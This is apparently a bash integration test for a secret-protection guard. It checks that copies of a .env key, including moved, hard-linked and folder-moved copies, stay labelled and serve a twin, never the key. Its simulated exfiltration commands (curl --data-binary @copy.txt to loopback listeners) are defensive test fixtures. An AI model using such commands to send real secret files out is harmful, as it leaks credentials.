#!/usr/bin/env bash
# derived-label-live.test.sh — confidentiality plan 13 D4 live: a copy of a
# secret made by a program allowed to read it stays a secret at the program
# gate, this session and the next, and under its new name after `mv` / `ln`.
#
# A real arbiter in mode `secrets` with a policy.yaml naming a copier as the
# reader of a `.env` (`mdu-copier`, a reader the test builds and pins by path
# and hash; `cp` itself, the reader until 2026-10-03, is a printer and admits
# nothing since plan 13 D8: asserted in (0)), the real mandu-net-guard with the launcher's secret
# policy file (the guard alone, no bind: the derived copy never had one), a
# listener on 127.0.0.2 that logs every byte it receives (the network), real
# processes. Before the fix the copy was opened raw by every program and
# `curl --data-binary @copy.txt` sent the key.
#
#   (0) `cp .env x` with cp listed copies nothing (printers admit nothing)
#   (1) `mdu-copier -o copy.txt .env` (the reader) makes a real copy; the arbiter labels it
#   (1c) plan 13 §9 R4 (b): a holder's mkdir, mv, ln -s on a local disk still run
#       (the name family is trapped under every secret policy), and a
#       non-holder's mkdir
#   (2) in the SAME guard run, a fresh untainted `cat copy.txt` sees the twin and
#       `curl --data-binary @copy.txt` sends the twin, never the key
#   (3) `mv copy.txt c2.txt` and `ln c2.txt c3.txt`: the label follows; cat and
#       curl of the new names send no key (same guard run)
#   (4) a NEW guard run (the next launch's guard): the moved and linked copies
#       are still gated
#   (5) the next launch's discovery lists the derived copies (outside the walked
#       home), so they are registered and twinned at launch
#   (6) the listener never received the key; it did receive the twin (the
#       control that curl really sent)
#   (7) plan 13 §4.6, the label by reference: the .env is bound to 127.0.0.3;
#       a program the human lets read the copy raw (an Inbox allow, once) may
#       send it there, where its source may go (before: nowhere, the copy
#       carried no binding), and (8) the same program is refused at the
#       unbound 127.0.0.2 (the oracle of (6) covers it)
#   (9) 2026-10-16: a copy moved WITH ITS FOLDER (a rename of a folder above
#       it, which renames no labelled name): the label follows to its new
#       path, so the same session and the next one (the copy opened after the
#       move, or not) still see the twin
# SKIPs where curl, python3 or the built guard are unavailable.
set -uo pipefail
REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
PASS=0; FAIL=0
ok()  { echo "  ok — $1"; PASS=$((PASS+1)); }
bad() { echo "  NOT OK — $1"; FAIL=$((FAIL+1)); }
skip() { echo "derived-label-live.test.sh: SKIP ($1)"; echo "1 skipped, 0 failed"; exit 0; }
# A broken run, not a missing prerequisite (the dev arbiter did not come up,
# or refused the setup calls): FAIL with why and, given a log, its last
# lines; never SKIP, or a suite that went quiet shows green
# (scripts/lib/ready-deadline.sh).
# shellcheck source=scripts/lib/ready-deadline.sh
. "$REPO/scripts/lib/ready-deadline.sh"
abort() { echo "  NOT OK — $1"; if [[ -n "${2:-}" ]]; then mdu_log_tail "$2"; fi; echo "derived-label-live.test.sh: $PASS passed, $((FAIL + 1)) failed"; exit 1; }
await_grep() { local i; for i in $(seq 1 300); do grep "$@" && return 0; sleep 0.1; done; grep "$@"; }
command -v curl >/dev/null 2>&1 || skip "curl not installed"
command -v python3 >/dev/null 2>&1 || skip "python3 not installed"
command -v nc >/dev/null 2>&1 || skip "nc not installed"
GUARD="$REPO/interceptors/target/release/mandu-net-guard"
[[ -x "$GUARD" ]] || GUARD="$REPO/interceptors/target/debug/mandu-net-guard"
[[ -x "$GUARD" ]] || skip "mandu-net-guard is not built (scripts/build-native.sh)"

WORK="$(mktemp -d "${TMPDIR:-/tmp}/mandu-derived.XXXXXX")"
cleanup() { [[ -n "${LST:-}" ]] && kill "$LST" 2>/dev/null; [[ -n "${LST3:-}" ]] && kill "$LST3" 2>/dev/null; "$REPO/scripts/dev-arbiter.sh" stop "$WORK/arb" 2>/dev/null; rm -rf "$WORK"; }
trap cleanup EXIT
# The runtime base (the instance registry, the human-plane socket): the
# suite's own, never the caller's $XDG_RUNTIME_DIR/mandu, also when the suite
# is killed; the lifeline (lib/lifeline.sh) ends the dev arbiter then, since
# `mandu reap` cannot see a registry here (test-organization.md §8.5).
export MANDU_RUNTIME_DIR="$WORK/rt"
source "$(dirname "${BASH_SOURCE[0]}")/lib/lifeline.sh"
mdu_lifeline_init "$WORK"

HOME_DIR="$WORK/home"; mkdir -p "$HOME_DIR"

# The readers: a tiny reader the test builds (tests/lib/holder-reader.c:
# `mdu-holder FILE…` prints, `-o DST` copies), under two names and pinned
# by path and hash (plan 13 D8: a printer by name admits nothing, and since
# the !437 leftover (2) neither does a renamed copy of one, by its hash; a
# pin names one binary). build_reader <name>: the binary's real path.
command -v cc >/dev/null 2>&1 || skip "no C compiler (cc) to build the pinned reader"
build_reader() {
  mkdir -p "$WORK/bin"
  cc -O2 -o "$WORK/bin/$1" "$REPO/tests/lib/holder-reader.c" >&2 || return 1
  readlink -f "$WORK/bin/$1"
}
COPIER="$(build_reader mdu-copier)" || skip "could not build the pinned reader"
HOLDER="$(build_reader mdu-holder)" || skip "could not build the pinned reader"
COPIER_SHA="$(sha256sum "$COPIER" | cut -d' ' -f1)"; HOLDER_SHA="$(sha256sum "$HOLDER" | cut -d' ' -f1)"
PROJ="$WORK/proj"; mkdir -p "$PROJ"
ENVF="$PROJ/.env"; CANARY="DERIVED_LIVE_CANARY_$RANDOM$RANDOM"
printf 'API_KEY=%s\n' "$CANARY" > "$ENVF"
cat > "$WORK/policy.yaml" <<YAML
version: 1
paths:
  - path: $ENVF
    level: no-model
    bindings: ["127.0.0.3"]   # (7): where the copy may go, by reference
    readers: [cp, { app: mdu-copier, path: $COPIER, sha256: $COPIER_SHA, prints: nothing }, { app: mdu-holder, path: $HOLDER, sha256: $HOLDER_SHA, prints: nothing }]   # cp admits nothing (0); mdu-holder for (4b)
YAML

mkdir -p "$WORK/arb"
# dev-arbiter.sh waits for both sockets on the shared readiness budget; a
# start that does not come up makes it say why, with its log's last lines,
# and exit non-zero: that FAILS this suite, never SKIPs it.
arb_env="$(MANDU_MODE=secrets MANDU_TENANT=test MANDU_POLICY_FILE="$WORK/policy.yaml" MANDU_LIFELINE_FIFO="$MANDU_LIFELINE_FIFO" "$REPO/scripts/dev-arbiter.sh" "$WORK/arb")" \
  || abort "the dev arbiter did not come up (dev-arbiter.sh exited $?; why and its log's last lines are above)"
eval "$(printf '%s\n' "$arb_env" | grep '^export ')"
SOCK="$MANDU_ARBITER_SOCK"
[[ -S "$SOCK" ]] || abort "dev-arbiter.sh reported up but $SOCK is no socket" "$WORK/arb/arbiter.log"
call() { printf '%s\n' "$1" | timeout 30 nc -U -q1 "$SOCK" 2>/dev/null | head -1; }
json_field() { node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const j=JSON.parse(s);const v=(j.result||{})[process.argv[1]];process.stdout.write(v==null?"":String(v))})' "$1"; }

# The launch's registration and twin of the labelled .env (as secret-setup does).
mkdir -p "$WORK/scope/twins"
REG="$(call "{\"id\":1,\"op\":\"registerSecret\",\"path\":\"$ENVF\"}")"
TW="$(printf '%s' "$REG" | json_field twin)"; SYM="$(printf '%s' "$REG" | json_field symbol)"
[[ -n "$SYM" ]] || { echo "$REG"; abort "the arbiter refused registerSecret" "$WORK/arb/arbiter.log"; }
if [[ -n "$TW" ]]; then printf '%s' "$TW" > "$WORK/scope/twins/env"; else printf '%s\n' "$SYM" > "$WORK/scope/twins/env"; fi
cat > "$WORK/scope/secret-policy.json" <<JSON
{"agentExe":"","ask":"never","session":"derived-live","unixDeny":["$WORK/rt/human"],"secrets":[
  {"path":"$ENVF","twin":"$WORK/scope/twins/env","level":"no-model"}]}
JSON
export MANDU_ARBITER_SOCK="$SOCK" MANDU_NET_GUARD_SECRETS="$WORK/scope/secret-policy.json" MANDU_NET_GUARD_PROTECT=1
G=(mdu_without_lifeline "$GUARD" --allow "127.0.0.0/8:*" --)  # never holds the lifeline (lib/lifeline.sh)

# The network: a listener on 127.0.0.2 that appends every byte it receives.
LISTENER='import socket,sys,threading
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind((sys.argv[2],0)); s.listen(16)
print(s.getsockname()[1], flush=True)
log=open(sys.argv[1],"ab",buffering=0)
def serve(c):
    c.settimeout(5); data=b""
    try:
        while True:
            b=c.recv(65536)
            if not b: break
            data+=b
            if b"\r\n\r\n" in data:
                h,_,body=data.partition(b"\r\n\r\n"); n=0
                for line in h.split(b"\r\n"):
                    if line.lower().startswith(b"content-length:"): n=int(line.split(b":")[1])
                if len(body)>=n: break
    except Exception: pass
    log.write(data+b"\n--\n")
    try: c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
    except Exception: pass
    c.close()
while True:
    c,_=s.accept(); threading.Thread(target=serve,args=(c,),daemon=True).start()'
python3 -c "$LISTENER" "$WORK/net.log" 127.0.0.2 > "$WORK/port" &
LST=$!
# (7) the bound destination: a second listener, on 127.0.0.3.
python3 -c "$LISTENER" "$WORK/net-bound.log" 127.0.0.3 > "$WORK/port3" &
LST3=$!
for _ in $(seq 1 50); do [[ -s "$WORK/port" ]] && break; sleep 0.1; done
PORT="$(cat "$WORK/port")"; [[ -n "$PORT" ]] || skip "the listener did not start"
for _ in $(seq 1 50); do [[ -s "$WORK/port3" ]] && break; sleep 0.1; done
PORT3="$(cat "$WORK/port3")"; [[ -n "$PORT3" ]] || skip "the bound listener did not start"
: > "$WORK/net.log"
URL="http://127.0.0.2:$PORT/up"
CURL="curl -s --noproxy '*' -m 10 -o /dev/null -w code=%{http_code}"

# (0) plan 13 D8, printers admit nothing: cp is listed, and copies no byte.
OUT0="$("${G[@]}" /bin/sh -c "cp '$ENVF' '$PROJ/nocopy.txt'; echo rc=\$?" 2>&1)"
if [[ -e "$PROJ/nocopy.txt" ]] && grep -q "$CANARY" "$PROJ/nocopy.txt"; then bad "a listed cp copied the secret: $(sed "s/$CANARY/<KEY>/g" <<<"$OUT0")"
else ok "printers admit nothing: a listed cp copies no byte of the secret"; fi
rm -f "$PROJ/nocopy.txt"

# (1)-(3): one guard run: the reader copies, then fresh untainted programs.
# (The pause first: the guard's orphan backstop, exec-routing.md §7.5, judges a
# tree root that started within one clock tick of a holder's taint an orphan
# of that holder once it exits. And the copier runs DETACHED, in a subshell its
# parent leaves at once: since 2026-10-03 the shell that runs a holder is one
# itself (it learns the holder's exit status, plan 13 §4.9), and its later
# programs with it; a file the detached subshell wrote would take the label,
# so the shell waits for its pid instead. Not what is under test: the
# programs below stand for later, untainted calls.)
OUT="$("${G[@]}" /bin/sh -c "
sleep 0.3
( ( sleep 0.2; '$COPIER' -o '$PROJ/copy.txt' '$ENVF' ) & echo \$! > '$WORK/cp.pid' )
P=\$(cat '$WORK/cp.pid'); i=0; while kill -0 \$P 2>/dev/null && [ \$i -lt 200 ]; do sleep 0.05; i=\$((i+1)); done
[ -e '$PROJ/copy.txt' ] && echo cp=0
echo CAT1; cat '$PROJ/copy.txt'; echo
$CURL --data-binary @'$PROJ/copy.txt' '$URL'; echo
mv '$PROJ/copy.txt' '$PROJ/c2.txt'; echo mv=\$?
echo CAT2; cat '$PROJ/c2.txt'; echo
$CURL --data-binary @'$PROJ/c2.txt' '$URL'; echo
ln '$PROJ/c2.txt' '$PROJ/c3.txt'; echo ln=\$?
echo CAT3; cat '$PROJ/c3.txt'; echo
$CURL --data-binary @'$PROJ/c3.txt' '$URL'; echo
" 2>&1)"
[[ "$OUT" == *"cp=0"* ]] && grep -q "$CANARY" "$PROJ/c2.txt" \
  && ok "the reader (mdu-copier) made a real copy of the secret (the bytes are on disk)" || bad "the copier did not copy: $OUT"
await_grep -q "labelWrittenPathTainted: $PROJ/copy.txt .* → no-model" "$WORK/arb/arbiter.log" \
  && ok "the arbiter labelled the copy (derived, no-model)" || bad "no derived label for copy.txt: $(grep -F "$PROJ" "$WORK/arb/arbiter.log" | tail -5)"
[[ "$OUT" != *"$CANARY"* ]] && ok "same session: cat of copy.txt, c2.txt (mv) and c3.txt (ln) printed no byte of the key" \
  || bad "a copy was read raw: $(printf '%s' "$OUT" | sed "s/$CANARY/<KEY>/g")
--- the arbiter's decisions ---
$(grep -E 'decideSecretOpen|labelWrittenPathTainted|followDerivedLabel' "$WORK/arb/arbiter.log" | sed "s/$CANARY/<KEY>/g" | tail -25)"
[[ "$(printf '%s\n' "$OUT" | sed -n '/^CAT1$/,/^code=/p')" == *'$MDU:'* ]] && ok "same session: an untainted cat of the copy sees its twin" || bad "cat copy.txt: $OUT"
[[ "$OUT" == *"mv=0"* && "$OUT" == *"ln=0"* ]] && ok "mv and ln of a derived copy still work" || bad "mv/ln: $OUT"
[[ "$(printf '%s\n' "$OUT" | sed -n '/^CAT2$/,/^code=/p')" == *'$MDU:'* && "$(printf '%s\n' "$OUT" | sed -n '/^CAT3$/,/^code=/p')" == *'$MDU:'* ]] \
  && ok "the label followed mv and ln: the new names are served the twin" || bad "c2/c3: $OUT"
await_grep -q "followDerivedLabel: $PROJ/copy.txt → $PROJ/c2.txt (rename)" "$WORK/arb/arbiter.log" \
  && ok "the arbiter recorded the rename (the label follows the file)" || bad "no follow for the rename: $(grep followDerived "$WORK/arb/arbiter.log" | tail -3)"
await_grep -q "followDerivedLabel: $PROJ/c2.txt → $PROJ/c3.txt (link)" "$WORK/arb/arbiter.log" \
  && ok "the arbiter recorded the hard link" || bad "no follow for the link: $(grep followDerived "$WORK/arb/arbiter.log" | tail -3)"
[[ "$(printf '%s\n' "$OUT" | grep -c '^code=200')" == 3 ]] && ok "curl sent each of the three requests (the network path is live)" || bad "curl did not reach the listener: $OUT"

# (1b) plan 13 §9 R4 (b), another local user: the copier asked 0644 (umask
#      022), and the guard created the copy with no group or other bits.
[[ "$(stat -c %a "$PROJ/c2.txt")" == 600 ]] && ok "the copy is closed to other local users (0600, asked 0644)" \
  || bad "the copy's mode is $(stat -c %a "$PROJ/c2.txt"): another local user reads the secret"

# (1c) plan 13 §9 R4 (b), 2026-10-04: the name family (mkdir with it) is
#      trapped under every secret policy, and a holder's call is performed by
#      the guard after its mount is judged. On this machine's own disk: a
#      shell that ran a reader (a holder from its wait, plan 13 §4.9) and its
#      later programs still mkdir, mv and ln -s; a shell holding nothing too.
OUT1C="$("${G[@]}" /bin/sh -c "
mkdir '$PROJ/nh-dir'; echo nhmkdir=\$?
'$HOLDER' '$ENVF' >/dev/null; echo held=\$?
mkdir '$PROJ/h-dir'; echo hmkdir=\$?
mkdir -p '$PROJ/h-dir/a/b'; echo hmkdirp=\$?
mv '$PROJ/h-dir' '$PROJ/h-dir2'; echo hmv=\$?
ln -s h-dir2 '$PROJ/h-sym'; echo hln=\$?
" 2>&1)"
[[ "$OUT1C" == *"nhmkdir=0"* && -d "$PROJ/nh-dir" ]] && ok "a shell holding nothing makes a directory under the guard" || bad "non-holder mkdir: $OUT1C"
[[ "$OUT1C" == *"held=0"* && "$OUT1C" == *"hmkdir=0"* && "$OUT1C" == *"hmkdirp=0"* && "$OUT1C" == *"hmv=0"* && "$OUT1C" == *"hln=0"* && -d "$PROJ/h-dir2/a/b" && -L "$PROJ/h-sym" ]] \
  && ok "after a reader ran, its shell's mkdir, mkdir -p, mv and ln -s on a local disk still run" || bad "holder name family on a local disk: $OUT1C"

# (4) the next launch's guard: a new guard run reads the derived labels afresh.
#     (R4 (b): its chmod that would open the copy to others is refused, with
#     the arbiter's own derived rows; a chmod of a plain file runs.)
printf 'PLAIN\n' > "$PROJ/plain-mode.txt"; chmod 600 "$PROJ/plain-mode.txt"
OUT2="$("${G[@]}" /bin/sh -c "cat '$PROJ/c2.txt'; echo; cat '$PROJ/c3.txt'; echo; $CURL --data-binary @'$PROJ/c3.txt' '$URL'; echo; chmod 644 '$PROJ/c3.txt' 2>/dev/null; echo chmod=\$?; chmod 644 '$PROJ/plain-mode.txt'; echo plainchmod=\$?" 2>&1)"
[[ "$OUT2" != *"$CANARY"* && "$OUT2" == *'$MDU:'* && "$OUT2" == *"code=200"* ]] \
  && ok "a new guard run (the next session): the moved and linked copies are still the twin, and curl sends no key" || bad "next guard run: $OUT2"
[[ "$OUT2" == *"chmod=1"* && "$(stat -c %a "$PROJ/c3.txt")" == 600 ]] \
  && ok "a later chmod 644 of the copy is refused; it stays 0600" || bad "chmod of the copy: $OUT2 / mode $(stat -c %a "$PROJ/c3.txt")"
[[ "$OUT2" == *"plainchmod=0"* && "$(stat -c %a "$PROJ/plain-mode.txt")" == 644 ]] \
  && ok "control: a chmod of an unlabelled file runs" || bad "plain chmod: $OUT2"

# (4b) a process that already HOLDS the source (mdu-holder, its reader, after it read
#      .env) reads the copy raw (it learns nothing new: npm's own child reading
#      the package npm wrote; `tail -n 1` prints the copy's line), and what it
#      feeds is still held to the source's hosts: curl reading its output is
#      refused at the unbound listener. (Before plan 13 §8 decision (b),
#      2026-10-02, the holder was a shell that sourced .env, as a listed
#      reader; a shell is no reader now. Until 2026-10-03 it was cat, a
#      printer, which admits nothing since plan 13 D8.)
OUT4="$("${G[@]}" /bin/sh -c "echo HOLDER; '$HOLDER' '$ENVF' '$PROJ/c3.txt' | tail -n 1; '$HOLDER' '$ENVF' '$PROJ/c3.txt' | tail -n 1 | $CURL --data-binary @- '$URL'; echo curl=\$?" 2>&1)"
[[ "$(printf '%s\n' "$OUT4" | sed -n '/^HOLDER$/,$p')" == *"$CANARY"* ]] \
  && ok "a holder of the source reads its copy raw (no new taint, no utility lost)" || bad "holder read: $OUT4"
[[ "$OUT4" != *"code=200"* ]] && ok "the holder's curl to the unbound listener is refused (its exits stay its source's)" || bad "the holder reached the unbound host: $OUT4"

# (9) 2026-10-16, a derived copy moved WITH ITS FOLDER: the guard follows a
#     label on a rename of the file itself, not on a rename of a folder
#     above it. One guard run makes the copy in a sub-folder and renames the
#     folder, without opening the copy after; the next guard run (the next
#     session) and the same run's later programs must still see the twin.
mkdir -p "$PROJ/sub"
OUT9="$("${G[@]}" /bin/sh -c "
sleep 0.3
( ( sleep 0.2; '$COPIER' -o '$PROJ/sub/d.txt' '$ENVF' ) & echo \$! > '$WORK/cp9.pid' )
P=\$(cat '$WORK/cp9.pid'); i=0; while kill -0 \$P 2>/dev/null && [ \$i -lt 200 ]; do sleep 0.05; i=\$((i+1)); done
mv '$PROJ/sub' '$PROJ/sub2'; echo mvdir=\$?
echo SAME; cat '$PROJ/sub2/d.txt'; echo
" 2>&1)"
grep -q "$CANARY" "$PROJ/sub2/d.txt" && ok "(9) the copier made the copy and its folder moved" || bad "(9) setup: $(sed "s/$CANARY/<KEY>/g" <<<"$OUT9")"
[[ "$OUT9" != *"$CANARY"* && "$(printf '%s\n' "$OUT9" | sed -n '/^SAME$/,$p')" == *'$MDU:'* ]] \
  && ok "(9) same session: the copy under its moved folder is the twin" || bad "(9) same session read the moved copy raw: $(sed "s/$CANARY/<KEY>/g" <<<"$OUT9")"
#     A second copy whose folder moves and which nobody opens in that run.
mkdir -p "$PROJ/sub3"
OUT9C="$("${G[@]}" /bin/sh -c "
sleep 0.3
( ( sleep 0.2; '$COPIER' -o '$PROJ/sub3/e.txt' '$ENVF' ) & echo \$! > '$WORK/cp9c.pid' )
P=\$(cat '$WORK/cp9c.pid'); i=0; while kill -0 \$P 2>/dev/null && [ \$i -lt 200 ]; do sleep 0.05; i=\$((i+1)); done
mv '$PROJ/sub3' '$PROJ/sub4'; echo mvdir=\$?
" 2>&1)"
grep -q "$CANARY" "$PROJ/sub4/e.txt" && ok "(9) a second copy made, its folder moved, not opened" || bad "(9) second setup: $(sed "s/$CANARY/<KEY>/g" <<<"$OUT9C")"
await_grep -q "followDerivedLabel: $PROJ/sub3/e.txt → $PROJ/sub4/e.txt (rename)" "$WORK/arb/arbiter.log" \
  && ok "(9) the folder's rename carried the copy's label to its new path" || bad "(9) no follow for the folder move: $(grep followDerived "$WORK/arb/arbiter.log" | tail -3)"
OUT9B="$("${G[@]}" /bin/sh -c "echo NEXT; cat '$PROJ/sub2/d.txt'; echo; echo NEXT2; cat '$PROJ/sub4/e.txt'; echo" 2>&1)"
[[ "$(printf '%s\n' "$OUT9B" | sed -n '/^NEXT$/,/^NEXT2$/p')" == *'$MDU:'* && "$(printf '%s\n' "$OUT9B" | sed -n '/^NEXT$/,/^NEXT2$/p')" != *"$CANARY"* ]] \
  && ok "(9) next session: the copy opened after its folder moved is still the twin" || bad "(9) next session read the opened moved copy raw: $(sed "s/$CANARY/<KEY>/g" <<<"$OUT9B")"
[[ "$(printf '%s\n' "$OUT9B" | sed -n '/^NEXT2$/,$p')" == *'$MDU:'* && "$(printf '%s\n' "$OUT9B" | sed -n '/^NEXT2$/,$p')" != *"$CANARY"* ]] \
  && ok "(9) next session: the copy NOT opened after its folder moved is still the twin" || bad "(9) next session read the unopened moved copy raw: $(sed "s/$CANARY/<KEY>/g" <<<"$OUT9B")"

# (7)-(8) plan 13 §4.6: the copy is labelled by reference to its source. A
#      program with no reader right to the copy asks (prompting on); the human
#      allows it ONCE (an *Always* would write a policy entry for the copy, an
#      exact human label that then decides alone). The program is
#      `mdu-holder` (curl, which read the copy itself until the !437
#      leftover (1), is a printer and is never asked about); the curl its
#      pipe feeds (a holder, D2) may send the copy to 127.0.0.3, the source's
#      binding; the same allow does not reach the unbound 127.0.0.2.
cat > "$WORK/scope/secret-policy-ask.json" <<JSON
{"agentExe":"","ask":"always","askTimeoutMs":20000,"session":"derived-live","unixDeny":["$WORK/rt/human"],"secrets":[
  {"path":"$ENVF","twin":"$WORK/scope/twins/env","level":"no-model"}]}
JSON
ADMIN="$MANDU_ADMIN_SOCK"
acall() { printf '%s\n' "$1" | timeout 10 nc -U -q1 "$ADMIN" 2>/dev/null | head -1; }
# Run "$2" under the guard with prompting on; allow its held open of the copy once.
allowed_once() {
  local out="$1" cmd="$2" pid aid=""
  ( MANDU_NET_GUARD_SECRETS="$WORK/scope/secret-policy-ask.json" "${G[@]}" /bin/sh -c "$cmd" > "$out" 2>&1 ) &
  pid=$!
  for _ in $(seq 1 150); do
    aid="$(acall '{"id":30,"op":"egressApprovals","status":"pending"}' | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{let a=[];try{a=(JSON.parse(s).result||{}).approvals||[]}catch{};const r=a.find(x=>String(x.destination).endsWith("/c3.txt")&&/^(open|trust):\//.test(x.symbol));process.stdout.write(r?r.id:"")})')"
    [[ -n "$aid" ]] && break; sleep 0.1
  done
  [[ -n "$aid" ]] && acall "{\"id\":31,\"op\":\"resolveEgressApproval\",\"approvalId\":\"$aid\",\"approve\":true,\"scope\":\"once\"}" >/dev/null
  wait "$pid"
  [[ -n "$aid" ]]
}
allowed_once "$WORK/bound.out" "'$HOLDER' '$PROJ/c3.txt' | $CURL --data-binary @- 'http://127.0.0.3:$PORT3/bound'; echo curl=\$?" \
  && ok "an approved program's open of the copy was held and allowed once" || bad "no held open of c3.txt to allow: $(cat "$WORK/bound.out")"
sleep 0.3
[[ "$(cat "$WORK/bound.out")" == *"code=200"* ]] && grep -q "$CANARY" "$WORK/net-bound.log" \
  && ok "the copy reached the source's bound host 127.0.0.3 raw (by reference; before: refused, the copy was bound nowhere)" \
  || bad "the copy did not reach the bound host: $(cat "$WORK/bound.out") / $(grep -E 'decideSecretOpen: .*c3' "$WORK/arb/arbiter.log" | tail -4)"
allowed_once "$WORK/unbound.out" "'$HOLDER' '$PROJ/c3.txt' | $CURL --data-binary @- '$URL'; echo curl=\$?" || true
[[ "$(cat "$WORK/unbound.out")" != *"code=200"* ]] && ok "the same allow does not reach the unbound 127.0.0.2: the copy goes only where its source may" \
  || bad "the copy reached the unbound host: $(sed "s/$CANARY/<KEY>/g" "$WORK/unbound.out")"

# (5) the next launch's discovery lists the derived copies (outside the walked home).
# (the walk runs on a worker thread and may outlast nc's one-second quit: a
# node client waits for the answer line)
call_long() { node -e 'const c=require("net").connect(process.argv[1]);let s="";c.on("data",d=>{s+=d;const i=s.indexOf("\n");if(i>=0){process.stdout.write(s.slice(0,i));c.end();}});c.on("connect",()=>c.write(process.argv[2]+"\n"));setTimeout(()=>process.exit(1),60000).unref()' "$SOCK" "$1"; }
DISC="$(call_long "{\"id\":2,\"op\":\"discoverSecrets\",\"roots\":[\"$HOME_DIR\"],\"home\":\"$HOME_DIR\"}")"
[[ "$DISC" == *"\"$PROJ/c2.txt\""* && "$DISC" == *"\"$PROJ/c3.txt\""* ]] \
  && ok "discovery lists the moved and linked copies, outside the walked roots" || bad "discovery: ${DISC:0:600}"

# (6) the oracle: the key never reached the network; the twin did.
sleep 0.3
if grep -q "$CANARY" "$WORK/net.log"; then bad "THE KEY REACHED THE NETWORK: $(grep -c "$CANARY" "$WORK/net.log") request(s)"; else ok "the listener never received a byte of the key"; fi
grep -q 'MDU:' "$WORK/net.log" && ok "the listener received the twin (curl really sent the file's served content)" || bad "the listener received no twin: $(head -c 400 "$WORK/net.log")"

# control: a plain file is unaffected
printf 'PLAIN_OK\n' > "$PROJ/plain.txt"
[[ "$("${G[@]}" /bin/cat "$PROJ/plain.txt" 2>&1)" == "PLAIN_OK" ]] && ok "an unlabelled file still reads raw under the guard" || bad "plain file read failed"
grep -q "$CANARY" "$ENVF" && grep -q "$CANARY" "$PROJ/c3.txt" && ok "the real files are intact" || bad "a real file changed"

echo "derived-label-live.test.sh: $PASS passed, $FAIL failed"
[[ $FAIL -eq 0 ]]
